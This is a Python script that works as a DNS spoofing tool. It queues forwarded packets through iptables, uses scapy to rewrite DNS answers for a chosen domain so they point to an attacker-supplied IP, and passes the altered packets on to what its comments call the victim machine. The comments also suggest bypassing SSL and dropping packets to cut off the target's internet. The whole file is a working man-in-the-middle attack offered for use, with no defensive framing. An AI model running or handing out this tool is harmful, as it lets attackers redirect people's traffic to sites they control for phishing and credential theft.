#!/usr/bin/env python3

  #first create a queue using command: "iptables -I FORWARD -j NFQUEUE --queue-num 0"
  #where 0 is queue number, it can be any number of developer choice and it's only for the forwarded packets
  #queue is created so packets can be modified and then forwarded to the victim machine
  #Make sure you bypass the ssl encryption

import netfilterqueue                                                           #module to access queue from python program
import scapy.all as scapy
import optparse
import subprocess

def get_arguements():
    # Parse the arguements from command line
    parser = optparse.OptionParser()                                             
    parser.add_option("-d", "--domain", dest="domain", help="Domain / String in domain")              
    parser.add_option("-r","--redirect",dest="ip",help="Spoof IP / redirect IP")
    options=parser.parse_args() [0]                                               

    # checks necessary options are provided
    if not options.domain:
        parser.error("[-]Please specify the Domain,use --help for more info")
    elif not options.ip:
        parser.error("[-]Please specify an Redirect IP,use --help for more info")

    return options


def flush():
    # Flush the iptables rule created at the beginning
    flush_result=subprocess.check_output("iptables --flush",shell=True)
    if not flush_result:
        print("[+] Successfully flushed iptables")


def process_packet(packet):
    # Modify and play with the packets 
    scapy_packet = scapy.IP(packet.get_payload())                   #wrapping the payload of this scapy IP layer and converting into scapy layer
                                                                    #get_payload method to view moare info
    if scapy_packet.haslayer(scapy.DNSRR):                          #RR for response and QR for request
        qname=scapy_packet[scapy.DNSQR].qname.decode()              #getting qname field value from dns qr layer
        global options
        # checks for target domain
        if options.domain in qname:
            print("[+] Spoofing target")
            answer= scapy.DNSRR(rrname=qname,rdata=options.ip)      #creating the dns answer response
            scapy_packet[scapy.DNS].an=answer                       #replacing modified answer with real answer 
            scapy_packet[scapy.DNS].ancount=1                       #ancount setting answer count value 1

            del scapy_packet[scapy.IP].len                          #deleting the lenght and chcksum fields to prevent the packet corruption
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # print(scapy_packet.show())
            packet.set_payload(bytes(scapy_packet))                 #replacing the real packet with modified packet



        # print(scapy_packet.show())                  #scapy method to get more details
    packet.accept()                                   #to allow the packet to reach their destination(target)
    # packet.drop()                                   #to drop the packets [CUTS the INTERNET of the target]


def queue_bind():
    # Binds the queue with id 0
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)                 
    queue.run()


def queue_create(): 
    # For capturing all the packets that are forwarded 
    create_result = subprocess.check_output("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)  #for the packets to be forwarded
    if not create_result:
        print("[+] Queue created with OUTPUT chain")

    # For the local machine 
    # create_result = subprocess.check_output("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)  #for packets going out of my machine
    # if not create_result:
    #     print("[+] Queue created with OUTPUT chain")
    # create_result = subprocess.check_output("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)  #for packets coming to my machine
    # if not create_result:
    #     print("[+] Queue created with INPUT chain")


# main code
options=get_arguements()
queue_create()

try:
    queue_bind()
except KeyboardInterrupt:
    print("[+]Detected Ctrl+C.....flushing iptables.....")
    flush()
    exit()
except Exception as error:
    print(error)
    flush()
    exit()